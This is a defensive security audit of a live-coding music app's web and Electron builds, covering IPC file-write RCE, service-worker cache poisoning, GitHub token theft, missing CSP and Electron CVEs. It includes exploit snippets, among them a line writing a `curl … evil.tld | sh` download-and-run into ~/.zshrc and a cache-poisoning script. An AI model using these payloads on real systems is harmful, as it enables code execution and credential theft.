# Live Music Coder — Backend/Application Security Audit
**Date:** 2026-08-16 · **Repo:** `.` (public, AGPL-3.0-or-later — deliberate, not drift) · **Targets:** web build at `https://live-music-coder.pro` + signed/notarized Electron 41 desktop app v1.1.0 · **Method:** read-only source audit + live header probe + shipped-bundle inspection (`codesign -d`), every candidate adversarially refuted before reporting.

## Verdict

**The web build is defensible. The desktop build is not.**

The web build's blast radius from a malicious shared pattern is bounded by the browser origin — real (GitHub PAT theft, permanent origin backdoor) but recoverable. The desktop build hands that same untrusted, by-design-evaluated code an **unauthenticated arbitrary-file-write primitive anywhere under `$HOME`**, with no CSP, no navigation guard, no permission handler, on an Electron build with a known context-isolation bypass. One share link plus the one click the share link exists to solicit equals **code execution on the user's Mac**.

The single most important structural fact the codebase does not encode anywhere: **`electron/preload.ts` treats the renderer as trusted, and `src/components/organisms/StrudelEditor.tsx` treats the renderer as a sandbox for strangers' code.** Those two beliefs cannot both hold. The architecture doc's §5.21/§5.23 describe the pieces; nothing states that no renderer caller is required because the attacker *is* the renderer.

Counts: **19 confirmed** (1 critical, 5 high, 7 medium, 6 low) · **7 refuted or downgraded**, including two of the four findings handed to me as established.

---

## 1. Threat model — what "evaluates untrusted code by design" actually means here

Verified at the metal, not inferred. `node_modules/@strudel/core/evaluate.mjs:29-38`:

```js
function safeEval(str, options = {}) {
  …
  const body = `"use strict";return (${str})`;
  return Function(body)();
}
```

`Function()` — global scope, no `with`, no scope proxy, no sandbox. The name `safeEval` is aspirational. Untrusted pattern code therefore executes **in the same realm as the application**, with unrestricted `window`.

Two ingest channels carry it: the lz-string URL hash (`src/lib/persistence/url.ts:73`) and GitHub Gists (`src/lib/persistence/gist.ts:177`). One user action fires it — I verified that shared code does **not** auto-evaluate: `StrudelEditor.tsx:431-433` gates the debounced live-eval on `liveModeRef && (isPlayingRef || composeModeRef)`, and `src/lib/store.ts:208` defaults `isPlaying: false` with no Zustand `persist` middleware anywhere. Pressing Run is required. Pressing Run is also the entire purpose of opening a share link.

### Reachable surface from inside one evaluated pattern

| Capability | Web build | Desktop build |
|---|---|---|
| `window.electronAPI` — 17 IPC methods incl. **arbitrary `$HOME` file write** | absent | **full, unauthenticated** |
| `localStorage` / `sessionStorage` — GitHub PAT, AES key, gist history | full | full |
| **Cache Storage** (service-worker backing store) | **full → persistent backdoor** | n/a (SW skipped under `file://`) |
| `location.href` → arbitrary origin | exfil only | **exfil + hands `electronAPI` to a remote origin** (no `will-navigate`) |
| `fetch` to arbitrary host | blocked by `connect-src` | **unrestricted** (no CSP in packaged build) |
| `new WebSocket()` to arbitrary host | blocked | **unrestricted** (and explicitly `ws: wss:` in the Electron CSP string) |
| Form POST / top-level nav exfil | **allowed** (no `form-action`, CSP3 has no `navigate-to`) | allowed |
| `api.github.com` with the stolen PAT | **allowlisted** | allowlisted |
| `getUserMedia({audio:true})` | denied by `Permissions-Policy: microphone=()` | **auto-granted** (no permission handler) into a mic-entitled signed process |
| WebMIDI | `sysex:false` at all 5 sites — cannot reflash firmware | same |
| Web Serial | user-gesture port picker | broken (no `select-serial-port` handler) |
| `window.__strudelRepl`, IndexedDB, `caches.keys()` | full | full |

---

## 2. CONFIRMED findings, ranked by residual severity

### D1 — CRITICAL · DESKTOP · Any shared pattern gets arbitrary file write under `$HOME` → RCE

**Exploit path (macOS/Linux, zero prerequisites beyond the user pressing Run):**

1. Attacker posts a share link or a gist ID (Discord, a forum, the project's own community).
2. Victim opens it in the desktop app, dismisses the advisory modal, presses Run — the documented, intended workflow.
3. The pattern executes `Function(body)()` in the main world and calls:
   ```js
   window.electronAPI.saveProjectToPath("curl -s https://evil.tld/x | sh\n", "/Users/<user>/.zshrc")
   ```
4. `electron/ipc/file.ts:49-59` → `resolveAllowedPath()` at `:14-23` resolves the path, sees it starts with `app.getPath('home') + '/'`, **returns it as safe**, and `writeFile(safe, json, 'utf-8')` writes fully attacker-controlled bytes. No dialog. No extension check. No user confirmation.
5. Next terminal launch = code execution. `~/Library/LaunchAgents/com.evil.plist` gives the same at next login; `~/.ssh/authorized_keys` gives remote access.

**Defenses that failed, in order:**
- **The path allowlist is the wrong shape.** Its own comment says "broad but bounded" — `$HOME` is not a bound, it is the entire threat surface of a desktop user. The repo already contains the correct pattern 40 lines away in a sibling file (`electron/ipc/window.ts:15-23`, `ALLOWED_PANELS` Set).
- **Least privilege was never applied.** Only 2 of 17 preload methods have a caller in `src/` (`TransportBar.tsx:367,374`). `saveProjectToPath` has **zero** renderer callers — it exists solely as an attack surface.
- **`contextIsolation: true` is not a defense here.** `contextBridge.exposeInMainWorld` deliberately publishes to the main world; that is where the pattern runs. The correct mental model is that `electronAPI` is a *public API for strangers*.
- **The shared-code modal does not gate this** (see W5).

**Adversarial checks that failed to refute it:** Is there a sender/origin check? No — `ipcMain.handle('file:save-path')` inspects nothing. Is the payload escaped? No — `json` is written verbatim. Is `resolveAllowedPath` symlink-safe? Irrelevant, `$HOME` already suffices. Does the user see anything? Nothing at all.

**Windows is accidentally safe:** the hardcoded `'/'` at `file.ts:18-19` means `C:\Users\x\…`.startsWith(`C:\Users\x/`) is always false → the guard returns `null` → the handler fails closed. The doc calls this "silently broken"; it is simultaneously the only thing protecting Windows users. Fixing the separator bug **without** narrowing the root would turn a broken feature into a live Windows RCE. Fix both in the same commit or neither.

**Falsifier:** launch the packaged app with `open -a "Live Music Coder" --args --lmc-debug`, then in the DevTools console:
```js
await window.electronAPI.saveProjectToPath('AUDIT-MARKER', require('os')?.homedir?.() ?? '~/lmc-audit-marker.txt')
// then, in a shell:  cat ~/lmc-audit-marker.txt
```
Refuted only if it returns `{error:'Path outside allowed directories'}` for a path inside `$HOME`.

---

### W1 — HIGH · WEB · Service-worker cache poisoning = permanent backdoor on `live-music-coder.pro`

Not in the architecture doc. This converts "one-shot execution the user consented to" into "silent execution on every future visit, before any gesture."

**Exploit path:**
```js
const [name] = await caches.keys();                  // 'lmc-1784313229346'
const c = await caches.open(name);
const url = performance.getEntriesByType('resource') // no guessing needed
             .map(e => e.name).find(n => n.includes('/assets/index-'));
await c.put(url, new Response(EVIL_JS, {headers:{'content-type':'application/javascript'}}));
```

`src/sw.template.js:55-65` serves `/assets/` **cache-first**: `caches.match(request).then(cached => cached || fetch(request))`. The poisoned chunk is returned ahead of the network on every subsequent load and survives browser restarts. It is evicted only when a new SW version's `activate` handler runs (`:29-42`) — i.e. at the next deploy, which is manual and infrequent.

**Verified live:** `curl -sSI https://live-music-coder.pro/sw.js` → `HTTP/2 200`, registered unconditionally in production at `src/main.tsx:31-40`. `dist/sw.js:8` → `const CACHE_NAME = 'lmc-1784313229346'`.

**Refutation attempts that failed:** CSP does not govern the Cache API. `cache.put()` accepts a synthetic same-origin `Response` (status 200, type `default`; it rejects only 206 and non-http(s) schemes). `Cache-Control: immutable` on `/assets/*` is irrelevant — the SW short-circuits before the HTTP cache.

**Consequence:** the PAT theft in W2 no longer needs the user to press Run ever again, and reinstalling the "app" (reloading the page) does not clear it. Only DevTools → Clear site data, or a deploy, does.

**Falsifier:** on `https://live-music-coder.pro/editor`, run the snippet above with `EVIL_JS = "document.title='POISONED'"`, hard-reload twice, observe the title. Refuted if the network copy wins.

---

### D2 — HIGH · DESKTOP · The packaged app ships with **no** Content-Security-Policy

The architecture doc rated this "probably"; it is certain, by two independent proofs.

1. **Authoritative:** Electron's own security guide — *"CSP's preferred delivery mechanism is an HTTP header. However, it is not possible to use this method when loading a resource using the `file://` protocol."* `electron/main.ts:155-171` delivers CSP **only** via `session.defaultSession.webRequest.onHeadersReceived`, and `main.ts:133` uses `loadFile()`. `grep -c http-equiv index.html` = 0; `dist/index.html` likewise.
2. **By contradiction:** if that header *did* apply under `file://`, its `script-src 'self'` would evaluate `'self'` against an opaque origin and block `file:///…/assets/index-*.js` — every shipped v1.1.0 build would be a black screen. They launch. Therefore no CSP is applied.

**What this actually costs:** `'unsafe-eval'` is required and irrelevant. What is lost is everything else — `connect-src`, `img-src`, `form-action`, `object-src`, `base-uri`, `frame-ancestors`. In the packaged app an evaluated pattern can `fetch()` any host on the internet. There is no containment layer whatsoever between untrusted code and the network.

**Falsifier:** `--lmc-debug`, then `fetch('https://example.com',{mode:'no-cors'})` and `document.querySelector('meta[http-equiv="Content-Security-Policy"]')`. A resolved fetch and a `null` meta confirm.

**Do not fix this by pasting the string from `main.ts:155-171` into a `<meta>` tag** — see D6.

---

### D3 — HIGH · DESKTOP · v1.1.0 shipped Electron 41.2.0, vulnerable to a context-isolation bypass that specifically targets this app's shape

`git show v1.1.0:package-lock.json` → `electron: 41.2.0`. Current `package.json` still `^41.2.0`; latest 41.x is **41.10.5**.

| Advisory | Title | Fixed in |
|---|---|---|
| GHSA-h7rp-cf8h-j98x / **CVE-2026-70601** | **Context isolation bypass via `Function.prototype.bind` hijack** | 41.2.2 |
| GHSA-ff2p-hmqr-hxm4 | **contextBridge object copy honors prototype setters** | 41.2.2 |
| GHSA-v64r-4m7r-3mvq | HTTP redirect followed into local file loader | 41.2.1 |
| GHSA-f2r8-jv7c-xqmp | DevTools embedder handler executes arbitrary files via shell open | 41.2.1 |
| GHSA-9f4c-93c8-jc8g | Sandboxed iframe bypasses allow-popups via OpenURL | 41.10.3 |

CVE-2026-70601 affects *"apps that expose Promise-returning functions to web content via contextBridge."* `electron/preload.ts` exposes exactly six: `getAppInfo`, `saveProject`, `saveProjectToPath`, `openProject`, `getRecentFiles`, `exportWav` — all `ipcRenderer.invoke`. This app is the advisory's worked example, and the untrusted code is delivered by the product's core feature.

**Honest residual:** the marginal escalation today is small — the legitimately exposed API (D1) is already lethal. It matters because it is the layer that has to hold *after* D1 is fixed, and because it removes contextIsolation from the defense stack of a build whose whole security story is "contextIsolation + sandbox."

**Falsifier:** `npm ls electron` → any version `< 41.10.5` confirms.

---

### D4 — HIGH · DESKTOP · No `will-navigate`: the pattern can hand `electronAPI` to a live remote origin

Confirmed: `grep -rn "will-navigate\|will-redirect" electron/` → 0 hits. `setWindowOpenHandler` (`main.ts:97-102`) covers only `window.open` on the main window, and only denies + `shell.openExternal` for `http(s)`/`mailto`.

`location.href = 'https://attacker.tld/'` from evaluated code navigates the **preload-attached** `webContents`. The preload re-runs on the new document, so `attacker.tld` receives the complete `electronAPI` surface — a persistent, interactive C2 with the D1 write primitive, no longer dependent on the pattern staying loaded. Electron docs: *"If your app has no need to navigate … limit navigation outright to that known scope."* This app needs to navigate to exactly one place: itself.

**Two corrections to the finding as handed to me:**
- **`will-attach-webview` is not needed.** `webviewTag` defaults to `false` and `grep -rn "webview" src/ electron/ index.html` → 0 hits. Listing it as a missing guard overstates the gap.
- **The pop-out window gap is defense-in-depth only, not exploitable.** `electron/ipc/window.ts:50-62` creates children with the same preload and *no* `setWindowOpenHandler`, but the `panelId` is allowlisted, no `/popout/*` route exists (so it renders first-party `NotFound`), and no attacker code ever executes there. Report it as hardening, not as a live hole.

**Falsifier:** `--lmc-debug`, run `location.href='https://example.com'`, then `typeof window.electronAPI` on the loaded page. `"object"` confirms.

---

### W2 — HIGH · WEB + DESKTOP · The GitHub PAT is fully reachable, and the CSP does not contain exfiltration

The architecture doc calls this "XSS-reachable." The sharper truth: **no XSS is required.** The product's advertised feature is the exploit primitive.

**Storage design (`src/lib/persistence/gist.ts:27-38`):**
```js
const key = await crypto.subtle.generateKey({name:'AES-GCM',length:256}, true, ['encrypt','decrypt']);
const exported = await crypto.subtle.exportKey('raw', key);
sessionStorage.setItem(PAT_KEY_KEY, btoa(String.fromCharCode(...new Uint8Array(exported))));
```
`extractable: true`, exported raw, base64'd into `sessionStorage` **beside** the ciphertext in `localStorage`. Any same-origin script reads both. The AES-GCM layer defends against exactly one adversary: someone reading a cold copy of `localStorage` without `sessionStorage`. It defends against nothing in this threat model. The non-remember path (`:115`) is plaintext `sessionStorage` and needs no work at all.

**Exfiltration is not contained, despite the connect-src allowlist.** The live CSP (verified by `curl -sSI https://live-music-coder.pro/`) is genuinely applied and blocks `fetch('https://evil')`. It does **not** stop:
- **Top-level navigation** — `location.href = 'https://evil/?t='+token`. CSP3 removed `navigate-to`; this is unpreventable by CSP.
- **Form POST** — there is **no `form-action` directive**, so an injected `<form action="https://evil" method="post">` submits anywhere. This one *is* fixable, one word.
- **In-place abuse via the allowlist** — `api.github.com` is permitted, so the PAT can simply be *used*: create a public gist with a findable marker, add a deploy key, enumerate private repos. The placeholder at `GistDialog.tsx:219` is `ghp_...`, so users will paste classic `repo`-scoped PATs.

**Recommendation must be honest:** no client-side storage survives same-origin script execution. `extractable:false` + IndexedDB is strictly better but not a fix. The changes that actually move the needle: add `form-action 'self'`; document that only `gist` scope is needed; **wipe the token whenever a share/gist payload is ingested** (a live-coding session that just loaded a stranger's code has no business holding a GitHub credential).

**Falsifier:** on the live site with a token stored, run `sessionStorage.getItem('lmc-gist-key')` and `localStorage.getItem('lmc-gist-token-enc')`; both non-null with `extractable:true` in the source confirms.

---

### D5 — MEDIUM-HIGH · DESKTOP · Microphone capture chain: unused entitlement + auto-granted permissions

Verified against the **shipped, signed v1.1.0 bundle**, not the source:

```
$ codesign -d --entitlements - "release/mac-arm64/Live Music Coder.app"
  com.apple.security.device.audio-input  => true
  com.apple.security.device.microphone   => true
$ PlistBuddy Info.plist | grep Usage
  NSMicrophoneUsageDescription = This app needs access to the microphone
```

The chain: pattern calls `navigator.mediaDevices.getUserMedia({audio:true})` → **Electron auto-approves**, per its own docs (*"By default, Electron will automatically approve all permission requests unless the developer has manually configured a custom handler"*); `grep -rn setPermissionRequestHandler electron/` → 0 hits → macOS shows one TCC prompt attributed to the notarized "Live Music Coder" → *a music application asking for microphone access is the most plausible prompt a user will ever see* → granted → the stream is exfiltrated over the network, which D2 leaves entirely unrestricted.

**The entitlement is pure over-privilege:** `grep -rn "getUserMedia" src/` → **0 hits**. Nothing in this app has ever used the microphone; `src/lib/audio/recorder.ts` taps `masterGain`, not an input device.

The web build is safe here: `Permissions-Policy: microphone=()` is served and verified live.

**Falsifier:** `--lmc-debug`, run `await navigator.mediaDevices.getUserMedia({audio:true})`. A TCC prompt (rather than an immediate `NotAllowedError`) confirms the web layer auto-granted.

---

### W3 — MEDIUM-HIGH · WEB + DESKTOP · The legacy plaintext PAT key is a **write** sink — attacker-token injection

New. The architecture doc notes `lmc-gist-token-persist` is "still read and never wiped" and treats it as leftover exposure. It is worse than that: **nothing ever writes it, and `getStoredToken()` still reads it** (`gist.ts:95-96`). That makes it an unguarded injection point.

```js
localStorage.setItem('lmc-gist-token-persist', 'ghp_ATTACKER_TOKEN')
```

For the majority of users — those with no token configured — this is the value `getStoredToken()` returns. `GistDialog` then calls it on mount (`:47-54`), sets `hasToken = true`, and **enables the Save button**. Every subsequent "Save to Gist" uploads the victim's private project code into the **attacker's** GitHub account. It persists in `localStorage` across sessions. Nothing in the UI reveals the account: the token field is `type="password"`, and the success link is built as `https://gist.github.com/${result.id}` (`GistDialog.tsx:123`) with no owner segment.

**Falsifier:** set the key to a valid PAT of a second account, reload, open the Gist dialog — if the token field shows as populated and Save is enabled, confirmed.

---

### W4 — MEDIUM · WEB + DESKTOP · The Gist ingest path bypasses the shared-code warning — violating the repo's own documented contract

`src/pages/Editor.tsx:70-71` carries the comment *"SECURITY: Always show warning for shared/external code — never skip"* and the architecture doc records it as a contract (§4, §3.8 step 4).

Both gist load paths break it:
- `GistDialog.handleLoad` (`:139-159`) → `loadFromGist` → `useAppStore.getState().loadProject({files})` — **no warning**.
- `DetailPanel.SavedGistsList.handleLoad` (`:28-41`) — identical, **no warning**.

A gist ID pasted from a forum loads a stranger's code into the editor with zero security signal, while the same code delivered by URL raises a modal. `loadProject` (`store.ts:431-443`) validates nothing per-file — `deserializeProject` (`local.ts:87-89`) only checks that `files` is an array; each entry's `code` is arbitrary.

---

### W5 — MEDIUM · WEB + DESKTOP · The one control guarding a desktop RCE is a dismiss-only modal — and it fires on the *trusted* path, not the untrusted one

The warning text, all three locales:
> "This code was loaded from a shared URL. Review it before running."

Weaknesses, in order of importance:

1. **Warning fatigue is engineered into onboarding.** Every first-party "Open in Editor" click passes `location.state.share` and therefore trips the identical warning: `Examples.tsx:274` (219 examples), `SessionPiece.tsx:52` (49 sessions), `Samples.tsx:204` (1745 samples). A user who explores the app for ten minutes dismisses this modal dozens of times on content Arnold wrote. By the time a genuinely hostile link arrives, the dismiss is muscle memory. Meanwhile the actually-unwarned path (W4) is silent. **The signal is inverted.**
2. **There is no "discard" option** — one button, `Dismiss` (`Editor.tsx:152-167`). The code is already in the store (`:62`, before the modal state is set at `:71`), so acknowledging is the only way forward.
3. **It does not describe the risk, and it is identical in both builds.** In the desktop app the accurate sentence is "this code can write files to your home directory." "Review it before running" is advice a non-programmer cannot act on, and most users of a live-coding IDE cannot audit a minified `lz-string` payload.

---

### D6 — MEDIUM · DESKTOP · The Electron CSP string is materially weaker than the web one — this becomes live the moment D2 is fixed

`electron/main.ts:160-167` vs `netlify.toml:22`:

| Directive | Web (live, verified) | Electron |
|---|---|---|
| `connect-src` | `'self'` + 5 named hosts | `'self' api.github.com *.strudel.cc` **`ws: wss:`** ← any host, bidirectional C2 |
| `img-src` | `'self' data: blob:` | `'self' data: blob:` **`https:`** ← any host, GET exfil |
| `default-src` | `'self'` | `'self' 'unsafe-inline' 'unsafe-eval' data: blob: file:` |
| `form-action` | absent | absent |
| `object-src` / `base-uri` / `frame-ancestors` | `'none'` / `'self'` / `'none'` | **all absent** |

`ws: wss:` with no host restriction is a wildcard outbound channel. **The obvious fix for D2 — moving this string into a `<meta http-equiv>` — would ship a CSP that permits exactly the exfiltration the web build blocks.** The meta tag must be built from the `netlify.toml` policy plus only what OSC genuinely needs (`ws://localhost:8080`), not from `main.ts`.

---

### D7 — MEDIUM (latent) · DESKTOP · No patch channel for Windows/Linux; no Windows signing

`gh release view v1.1.0 --json assets` → `latest-mac.yml` + 4 macOS artifacts. **No `latest.yml`, no `latest-linux.yml`, no `.blockmap`.** `package.json` configures `win: [nsis, portable]` and `linux: [AppImage, deb]` targets and a `publish: github` provider, but no `certificateFile`/`publisherName` for Windows.

`electron/updater.ts` polls every 4h with `autoDownload: true`. A Windows or Linux user gets a 404 forever — **no mechanism exists to deliver a fix for D1 to them.** Unsigned NSIS also means electron-updater cannot verify a publisher on Windows.

**Downgraded honestly:** no Windows or Linux artifact has ever been published (all five releases are macOS-only), so there are no affected users today. The risk goes live the first time `npm run electron:build:win` output is shipped. Also: no `.github/workflows/` at all — releases are hand-built on one laptop with no provenance or attestation, and `npm run build` runs neither lint nor tests.

---

### S1 — MEDIUM · BOTH · Supply chain: 14 advisories, no gate

`npm audit` → 9 high / 4 moderate / 1 low. Triaged by actual reachability:

- **Ships in the desktop binary:** `electron` (D3) — the only one that matters.
- **Ships in the browser bundle:** `react-router-dom 7.16.0` → **REFUTED as exploitable.** The open-redirect (GHSA-wrjc-x8rr-h8h6) needs a user-controlled path; every `navigate()` and `<Link to>` in `src/` takes a string literal (verified across all 8 call sites). The RSC/SSR advisories require server rendering; this is a client-only SPA. Patch for hygiene, not urgency.
- **Not shipped:** `brace-expansion`, `js-yaml`, `nanoid`, `extract-zip`, `fast-uri`, `joi`, `undici`, `@babel/core` — all build/dev-time. `extract-zip`'s symlink traversal is a build-machine risk only.
- **`ws` (high, via `@strudel/osc` → `osc`) — REFUTED for the browser.** `grep -c "Sec-WebSocket-Key\|PerMessageDeflate" dist/assets/vendor-strudel-*.js` → **0**. The Node WebSocket implementation is not in the bundle; the browser uses native `WebSocket`. Note the only fix npm offers is a **downgrade** to `@strudel/osc@1.2.10` — do not take it.

No slopsquatting: all 40 runtime dependencies resolve to real, established registry packages.

---

### D8 — LOW-MEDIUM · DESKTOP · `app:quit` and `app:notify` accept anything from the renderer

`electron/ipc/app.ts:22-29`:
- `electronAPI.quit()` → `app.quit()` unconditionally, no unsaved-work guard. A one-line pattern kills the app mid-performance and discards the set — and per architecture §5.11 there is **no IndexedDB autosave** to recover from. For a live-performance tool this is a real availability harm, not a nuisance.
- `electronAPI.notify(title, body)` → `new Notification({title, body}).show()` with renderer-controlled strings, rendered by macOS under the identity of a **signed, notarized, Developer-ID application**. Credible phishing ("Live Music Coder — Update required, visit …"). Both are `ipcRenderer.send` with no validation and no rate limit.

---

### D9 — LOW-MEDIUM · DESKTOP · `audio:export-wav` unvalidated — **but the severity as handed to me is overstated**

Confirmed: `electron/ipc/audio.ts:13-34` passes `buffer`, `sampleRate`, `channels` straight into `encodeWav` with no checks. Two corrections after tracing it:

- **"OOMs the main process"** — the allocation at `wav-encoder.ts:20` happens **after** `dialog.showSaveDialog` returns a user-chosen path (`audio.ts:21-27`). It cannot be reached without a human clicking Save. A 1 GB `ArrayBuffer` then allocates ~536 MB and runs a 268M-iteration loop that stalls the main thread — real, but user-gated.
- **"a negative/NaN `sampleRate` throws `ERR_OUT_OF_RANGE`"** — true, but the throw occurs inside an `ipcMain.handle` async handler, which Electron catches and serializes back as a renderer-side rejection. **The main process does not crash.**

The genuinely un-gated abuse is **modal-dialog spam**: a loop calling `exportWav()` queues sheet-modal save dialogs on the parent window and locks the UI. Fix is still correct (`Number.isInteger` + range clamps + a byte cap **before** the dialog), just for a smaller reason than stated.

---

### W6 — LOW · WEB · Two CSP hygiene items

1. **`freesound.org` and `*.freesound.org` are allowlisted in `connect-src` for code that does not exist.** `grep -rn "freesound" src/` → **0 hits**. A dead allowlist entry is a live exfiltration destination — freesound.org accepts authenticated uploads. Delete it.
2. **`script-src … data:` and `script-src-elem … data:`** permit `<script src="data:text/javascript,…">`, a well-known CSP-bypass enabler. `blob:` covers the worker/AudioWorklet cases (`worker-src` already lists both). Verify `data:` is unused, then drop it. *Falsifier before removing:* deploy to a branch preview without `data:` in `script-src*` and exercise `/editor` + all four engines with the console open; zero `securityPolicyViolation` events means it was never needed.

---

### W7 — LOW · WEB + DESKTOP · `href` rendered from `localStorage`

`DetailPanel.tsx:56` and `GistDialog.tsx:349` render `href={g.url}` from `lmc-saved-gists`, which evaluated code can rewrite. **Downgraded, not refuted:** it is not an escalation (the attacker already has script execution in the same origin), and React 19 blocks `javascript:` URLs. Its only real value to an attacker is *persistence across reload* via a link the user might click — and W1 is a far better persistence primitive. Validate the origin is `gist.github.com` when reading; treat as hardening.

---

### D10 — LOW · DESKTOP · `com.apple.security.cs.allow-dyld-environment-variables` — **deliberately downgraded, do not escalate this**

Present in **both** plists and confirmed in the shipped signature. The instinct is to call it a TCC-bypass enabler for a microphone-entitled app. That instinct is wrong here, and I checked before writing it up: `com.apple.security.cs.disable-library-validation` is **absent**, and the binary carries the hardened-runtime flag (`flags=0x10000(runtime)`). Library validation therefore still rejects any dylib not signed by Team `B56AY3K74V` or Apple, so `DYLD_INSERT_LIBRARIES` injection does not work. It remains unnecessary for Electron and should be dropped on the next signing cycle, but it is **hardening, not a hole.**

---

## 3. REFUTED and downgraded — what I could not stand behind

| Candidate | Verdict | Why |
|---|---|---|
| Shared code auto-executes on load | **REFUTED** | `StrudelEditor.tsx:431-433` requires `liveMode && (isPlaying \|\| composeMode)`; `store.ts:208` defaults `isPlaying:false`; no `persist` middleware exists. Run is mandatory. |
| Persistent XSS via a `localStorage` key read at startup | **REFUTED** | Every key (`lmc-editor-settings`, `lmc-midi-learn`, `lmc-streak`, `lmc-onboarded`, `lmc-tutorial-done`, i18n) feeds config, never an eval path. W1 is the persistence vector, not `localStorage`. |
| Code injection via imported sample filename (`sample-import.ts:57`) | **REFUTED** | `file.name` is stripped to `[a-zA-Z0-9_-]` and lowercased before interpolation — no quote, paren or backtick can survive. |
| Path traversal via the `download` attribute (`StrudelEditor.tsx:713`) | **REFUTED** | Browsers sanitise path separators in `download`. |
| `parseGistId` SSRF | **REFUTED** | `gist.ts:194-198` accepts only `[a-f0-9]+`; Octokit builds the URL. |
| WebMIDI SysEx firmware attack | **REFUTED** | `sysex: false` at all five `requestMIDIAccess` sites (`StrudelEditor.tsx:182`, `midi-learn.ts:111`, `input.ts:33`, `strudel-keys.ts:157,337`). |
| `dangerouslySetInnerHTML` XSS | **REFUTED** | One occurrence, `Legal.tsx:120`, fed by two module constants in `src/data/legal.ts`. No user data path. |
| Committed secrets | **REFUTED** | `git grep -E "ghp_…|sk-…|AKIA…|BEGIN … PRIVATE KEY"` across the tree and `git log --all -S"ghp_"` return only the UI placeholder `ghp_...` at `GistDialog.tsx:219`. No `.env` tracked. No source maps in `dist/`. |
| `will-attach-webview` missing (as handed to me) | **REFUTED as a gap** | `webviewTag` defaults to `false`; zero `<webview>` in the repo. |
| Pop-out windows lack `setWindowOpenHandler` | **DOWNGRADED** | Real gap, but `panelId` is allowlisted, the route 404s to first-party `NotFound`, and no attacker code reaches it. Hardening only. |
| `audio:export-wav` crashes the main process | **CORRECTED** | See D9 — dialog-gated allocation, and `ipcMain.handle` catches the throw. |
| `react-router` / `ws` advisories | **REFUTED as reachable** | See S1. |

---

## 4. Verified clean — defenses that held

- **`contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`** on the main window (`main.ts:65-70`) *and* on pop-outs (`window.ts:56-61`). `webSecurity` is never disabled. The preload uses only `contextBridge` + `ipcRenderer`. The baseline is correct; the failure is what was placed *on top* of it.
- **`window:popout` is validated properly** — `ALLOWED_PANELS` Set + `MAX_POPOUTS` (`window.ts:15-29`). This is the pattern `resolveAllowedPath` should have copied.
- **Live web security headers are real and correctly applied** (verified against production, not just `netlify.toml`): CSP, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`, HSTS with `preload`. The manual `netlify deploy` path does apply `netlify.toml` headers — I confirmed this rather than assuming it.
- **`/sw.js` is served `max-age=0, must-revalidate`** — a new service worker is picked up promptly.
- **Prototype-pollution guards are real and correct** — `safeJsonParse` (`local.ts:65-74`) and `deserializeProject` (`local.ts:81-84`) both reject `__proto__`/`constructor` via a `JSON.parse` reviver, and `deserializeProject` type-checks `files`, `bpm` and `defaultEngine`.
- **Share-payload hardening** — `decodeFromUrl` (`url.ts:28-47`) caps the decompressed payload at 64 KB and allowlists `EngineType`. BPM is clamped through `setBpm` on every load path (`store.ts:441`).
- **macOS code-signing posture is correct** — Developer ID `Jorge Arnold Wender González (B56AY3K74V)`, hardened runtime flag set, `notarize: true`, `allow-unsigned-executable-memory` correctly removed, **`disable-library-validation` correctly absent**, no camera entitlement.
- **`build/entitlements.mac.inherit.plist` keeps `allow-jit`.** This is right and the comment documenting the v1.0.1 black-screen regression is right. **The `.wm-electron-audit.md` S2 recommendation must never be re-applied.**
- **`.github/SECURITY.md` is honest** — private vulnerability reporting, and it explicitly declines to promise a response time it cannot meet. Keep it exactly as written.
- **Sandbox-relevant hygiene:** no `<webview>`, no iframes, no source maps in `dist/`, no `.env` tracked, `sysex:false` everywhere, `release/`+`out/`+`dist/` all correctly gitignored.

---

## 5. `[NEEDS ARNOLD]`

1. **`[NEEDS ARNOLD]` — DSGVO Art. 13: undisclosed automatic third-country transfer.** Every visit to `/editor` fires `samples('github:tidalcycles/Dirt-Samples/master')` (`StrudelEditor.tsx:258`, plus `ExampleGallery.tsx:85` and `useInlinePlayer.ts:50`), resolving to `raw.githubusercontent.com` — GitHub Inc., USA — transmitting the visitor's IP with no consent and no notice. `src/data/legal.ts` names GitHub **only** in the optional Gist section under Art. 6(1)(a) consent; `grep -oiE "githubusercontent|dirt.?samples|CDN"` over it returns **zero hits**. This affects 100% of editor users, not the small minority who configure a PAT. Needs either a Datenschutz paragraph (recipient, purpose, legal basis Art. 6(1)(f), DPF reference) or self-hosting the sample pack.
2. **`[NEEDS ARNOLD]` — production release decision.** D1 is exploitable in the currently distributed, notarized v1.1.0. Fixing it requires a rebuild, re-sign, re-notarize and a new GitHub release; macOS users receive it via `latest-mac.yml`. Decide whether v1.1.0 should be pulled or superseded quietly. Ship D1 + D2 + D3 (Electron → 41.10.5) in the same release.
3. **`[NEEDS ARNOLD]` — Windows/Linux distribution policy.** Either publish `latest.yml` / `latest-linux.yml` with a Windows signing certificate, or remove the `win`/`linux` targets from `package.json` so no unpatchable binary can ever leave the machine.
4. **`[NEEDS ARNOLD]` — product decision on the PAT.** Given W2's conclusion (no client-side storage survives same-origin script execution in an app that evaluates strangers' code), decide between: (a) keep PATs, add `form-action 'self'`, document `gist`-only scope, and wipe the token on every share/gist ingest; or (b) drop the token requirement for *reading* public gists — note the app currently demands a PAT even to read one (`gist.ts:178-179`), which is unnecessary and inflates the number of users holding a credential in the first place.

---

## 6. Fix order — highest exploitability-reduction per unit of work

1. **Narrow `resolveAllowedPath` to one app-owned directory** (`~/Documents/Live Music Coder/`), enforce a `.lmc` extension, use `path.relative` + `path.sep` (fixing Windows and the root in the same commit), and **delete the 15 preload methods with no renderer caller** — keep `saveProject` and `notify`. Kills D1 outright and most of D4's and D8's value. *One file, ~20 lines.*
2. **`app.on('web-contents-created', … 'will-navigate')`** pinned to the app's own origin/`file://` path + `setWindowOpenHandler` on pop-outs. Kills D4.
3. **`session.setPermissionRequestHandler` denying everything except `midi`**, and drop `device.microphone` + `device.audio-input` + `allow-dyld-environment-variables` from both plists. Kills D5 and D10.
4. **`electron@^41.10.5`.** Kills D3. One line.
5. **Add a `<meta http-equiv="Content-Security-Policy">` to `index.html`, built from the `netlify.toml` policy** (not from `main.ts`), adding only `ws://localhost:8080` for OSC. Kills D2 without introducing D6.
6. **Delete the `lmc-gist-token-persist` read at `gist.ts:95-96`** and actively `removeItem` it on load; add `form-action 'self'` and drop `freesound.org` + `script-src data:` from the CSP; clear the stored token whenever a share/gist payload is ingested. Kills W3, most of W6, and shrinks W2.
